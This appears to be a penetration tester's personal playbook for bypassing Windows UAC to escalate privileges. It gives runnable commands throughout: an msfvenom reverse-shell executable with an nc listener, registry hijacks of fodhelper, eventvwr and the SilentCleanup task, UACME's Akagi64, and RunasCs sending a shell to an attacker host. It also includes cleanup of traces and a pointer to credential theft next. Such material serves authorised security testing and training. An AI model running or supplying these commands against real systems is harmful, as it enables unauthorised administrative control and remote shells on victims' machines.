# Windows privesc: UAC bypass

## Do I need one
whoami /groups | findstr /i "Label Administrators"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
- [ ] In BUILTIN\Administrators at Medium Mandatory Level: UAC is filtering me, so a bypass
- [ ] High Mandatory Level: already elevated, nothing to do
- [ ] EnableLUA 0x0: UAC is off, and my token is not filtered
- [ ] ConsentPromptBehaviorAdmin 0x2, always notify: these bypasses fail
- [ ] A domain account in Administrators, or the built-in Administrator, gets a full token over evil-winrm: no bypass needed
[Environment]::Is64BitProcess
- [ ] False: a 32-bit shell, so C:\Windows\Sysnative\fodhelper.exe in place of fodhelper.exe

## A payload
On Kali, then into the target's upload/ folder for serve:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe
rlwrap nc -lvnp <LPORT>
- [ ] Fetched to C:\Users\Public\rev.exe on the target, with the line serve files gives

## fodhelper
From cmd.exe, since PowerShell drops the empty "":
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "C:\Users\Public\rev.exe" /f
fodhelper.exe
reg delete HKCU\Software\Classes\ms-settings /f
- [ ] Defender knows this one: a shell that dies at once means it was caught

## fodhelper from PowerShell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\Public\rev.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force

## eventvwr, on older Windows
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "C:\Users\Public\rev.exe" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
- [ ] Fixed in Windows 10 1703: fodhelper there instead

## SilentCleanup
The task runs %windir%\system32\cleanmgr.exe at high integrity, so windir is pointed at my program:
reg add HKCU\Environment /v windir /d "cmd.exe /c C:\Users\Public\rev.exe &&" /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete HKCU\Environment /v windir /f

## UACME
Akagi64.exe, built from UACME and put in the target's upload/ folder, with a method number from its list for this build:
.\Akagi64.exe THE-METHOD C:\Users\Public\rev.exe

## With a desktop
- [ ] Right-click, Run as administrator: as an administrator I only confirm, with no password
- [ ] Older builds: msconfig, then Tools, Command Prompt, Launch

## With the password
RunasCs, from :Pb runas:
.\RunasCs.exe "<Username>" "<Password>" cmd.exe -r <LHOST>:<LPORT> --bypass-uac

## Afterwards
whoami /groups | findstr /i "Label"
- [ ] High Mandatory Level in the new shell
- [ ] Every registry value I set removed
- [ ] Hashes next: :Pb windows-creds
